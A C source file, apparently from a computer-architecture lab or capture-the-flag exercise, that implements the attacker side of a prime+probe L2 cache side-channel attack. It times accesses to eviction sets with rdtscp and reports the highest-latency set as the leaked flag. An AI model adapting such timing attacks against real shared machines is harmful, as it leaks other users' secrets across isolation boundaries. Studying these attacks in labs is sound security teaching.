// attacker.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>    // For sleep()
#include "util.h"      // ❗ Critical to include this

#define NUM_SETS NUM_L2_CACHE_SETS
#define CACHE_LINES_PER_SET 8
#define SAMPLE_COUNT 1000

int main() {
    printf("Attacker started...\n");

    // Allocate hugepage buffer
    char *buffer = get_buffer();
    if (!buffer) {
        printf("Failed to allocate buffer.\n");
        return 1;
    }

    // Get candidate eviction sets
    char **candidate_sets = get_candidate_sets();
    if (!candidate_sets) {
        printf("Failed to get candidate sets.\n");
        return 1;
    }

    uint64_t times[NUM_SETS] = {0};

    // Measure latency for each set
    for (int sample = 0; sample < SAMPLE_COUNT; sample++) {
        for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
            uint64_t total_latency = 0;
            char **set = (char **)&candidate_sets[set_idx * CACHE_LINES_PER_SET];

            // Access each line in the set
            for (int i = 0; i < CACHE_LINES_PER_SET; i++) {
                lfence();
                uint64_t start = rdtscp64();
                *(volatile char *)set[i];  // Access memory
                lfence();
                uint64_t end = rdtscp64();
                total_latency += (end - start);
            }

            times[set_idx] += total_latency;
        }
    }

    // Find the set with maximum latency
    int guessed_flag = -1;
    uint64_t max_latency = 0;
    for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
        if (times[set_idx] > max_latency) {
            max_latency = times[set_idx];
            guessed_flag = set_idx;
        }
    }

    printf("\nFinal guessed flag is: %d\n", guessed_flag);

    // Clean up (optional, not strictly needed since program exits)
    free_candidate_sets();
    free_buffer();

    return 0;
}
